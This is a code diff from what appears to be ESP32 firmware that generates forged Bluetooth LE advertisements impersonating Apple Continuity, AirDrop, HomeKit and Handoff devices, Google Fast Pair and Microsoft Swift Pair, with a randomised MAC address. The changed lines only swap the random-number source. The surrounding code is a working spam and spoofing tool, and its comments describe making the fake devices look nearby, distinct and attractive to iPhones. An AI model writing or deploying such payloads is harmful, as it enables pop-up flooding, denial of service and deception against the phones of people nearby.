@@ -20,26 +20,26 @@ void generateContinuityPayload(uint8_t *buf, uint8_t &len) {
     buf[2] = 0x00;           // Apple Inc. MSB
 
     // Continuity type (varies: 0x01-0x09 for different Apple services)
-    uint8_t contType = random(0x01, 0x0A);
+    uint8_t contType = ((esp_random() % 9) + 1);
     buf[3] = contType;
     buf[4] = 0x00;
 
     // Random sequence ID (mimics real device state changes)
-    uint32_t seq = random(0xFFFFFFFF);
+    uint32_t seq = (esp_random() % 0xFFFFFFFF);
     buf[5] = (seq >> 24) & 0xFF;
     buf[6] = (seq >> 16) & 0xFF;
     buf[7] = (seq >> 8) & 0xFF;
     buf[8] = seq & 0xFF;
 
     // Status flags (connected/available + power level)
-    buf[9] = 0x01 | (random(0x00, 0x08) << 1);
+    buf[9] = 0x01 | ((esp_random() % 8) << 1);
 
     // Fake RSSI (appears strong = device nearby = more convincing)
-    buf[10] = random(0xC0, 0xFF);
+    buf[10] = ((esp_random() % 63) + 192);
 
     // Random device identifier (makes each packet look like different device)
     for (int i = 11; i < 19; i++) {
-        buf[i] = random(0x00, 0xFF);
+        buf[i] = (esp_random() % 255);
     }
 
     len = 19;
@@ -50,13 +50,13 @@ void generateFastPairPayload(const String &ssid, uint8_t *buf, uint8_t &len) {
     buf[1] = 0xE1;           // Vendor ID: Google (0x00E1 LE)
     buf[2] = 0x00;           //
 
-    uint16_t modelId = random(0x0001, 0xFFFF);
+    uint16_t modelId = ((esp_random() % 65534) + 1);
     buf[3] = (modelId >> 8) & 0xFF;
     buf[4] = modelId & 0xFF;
 
     uint8_t flags = 0x00;
-    if (random(0, 2)) flags |= 0x04;  // discoverable
-    if (random(0, 2)) flags |= 0x01;  // show UI indicator
+    if ((esp_random() % 2)) flags |= 0x04;  // discoverable
+    if ((esp_random() % 2)) flags |= 0x01;  // show UI indicator
     buf[5] = flags;
 
     len = 6;
@@ -67,11 +67,11 @@ void generateSwiftPairPayload(uint8_t *buf, uint8_t &len) {
     buf[1] = 0x06;           // Microsoft
     buf[2] = 0x00;           // Microsoft
 
-    uint16_t devType = random(0x0001, 0xFFFF);
+    uint16_t devType = ((esp_random() % 65534) + 1);
     buf[3] = (devType >> 8) & 0xFF;
     buf[4] = devType & 0xFF;
 
-    uint8_t subType = random(0x01, 0x05);
+    uint8_t subType = ((esp_random() % 4) + 1);
     buf[5] = subType;
 
     len = 6;
@@ -82,12 +82,12 @@ void generateGenericPairingPayload(uint8_t *buf, uint8_t &len) {
     buf[1] = 0x06;           // LE General Discoverable, BR/EDR Not Supported
 
     buf[2] = 0xFF;           // Manufacturer Specific Data
-    uint16_t mfg = random(0x004C, 0x0400);
+    uint16_t mfg = ((esp_random() % 948) + 76);
     buf[3] = mfg & 0xFF;
     buf[4] = (mfg >> 8) & 0xFF;
 
     for (int i = 5; i < 15; i++) {
-        buf[i] = random(0x00, 0xFF);
+        buf[i] = (esp_random() % 255);
     }
 
     len = 15;
@@ -104,11 +104,11 @@ void generateAirDropPayload(uint8_t *buf, uint8_t &len) {
 
     // Fake device hash (different each packet = looks like multiple devices)
     for (int i = 5; i < 15; i++) {
-        buf[i] = random(0x00, 0xFF);
+        buf[i] = (esp_random() % 255);
     }
 
     // Capabilities + status (appears ready to receive)
-    buf[15] = 0x01 | (random(0, 0x02) << 1);
+    buf[15] = 0x01 | ((esp_random() % 2) << 1);
 
     len = 16;
 }
@@ -124,15 +124,15 @@ void generateHomeKitPayload(uint8_t *buf, uint8_t &len) {
 
     // Random accessory ID (looks like different HomeKit device each time)
     for (int i = 5; i < 11; i++) {
-        buf[i] = random(0x00, 0xFF);
+        buf[i] = (esp_random() % 255);
     }
 
     // Status flags: 0x01 = unpaired/pairing mode (very attractive to iPhone)
-    buf[11] = 0x01 | random(0x00, 0x04);
+    buf[11] = 0x01 | (esp_random() % 4);
 
     // Setup code hash (looks legitimate)
-    buf[12] = random(0x00, 0xFF);
-    buf[13] = random(0x00, 0xFF);
+    buf[12] = (esp_random() % 255);
+    buf[13] = (esp_random() % 255);
 
     len = 14;
 }
@@ -148,18 +148,18 @@ void generateHandoffPayload(uint8_t *buf, uint8_t &len) {
 
     // Fake activity ID (different each time)
     for (int i = 5; i < 13; i++) {
-        buf[i] = random(0x00, 0xFF);
+        buf[i] = (esp_random() % 255);
     }
 
     // App type (Safari, Mail, Notes, etc)
-    buf[13] = random(0x01, 0x0F);
+    buf[13] = ((esp_random() % 14) + 1);
 
     len = 14;
 }
 
 void randomizeBLE_MAC(uint8_t *addr) {
     for (int i = 0; i < 6; i++) {
-        addr[i] = random(0x00, 0xFF);
+        addr[i] = (esp_random() % 255);
     }
     addr[0] &= 0xFE;  // ensure random private address (bit 0 = 0)
 }
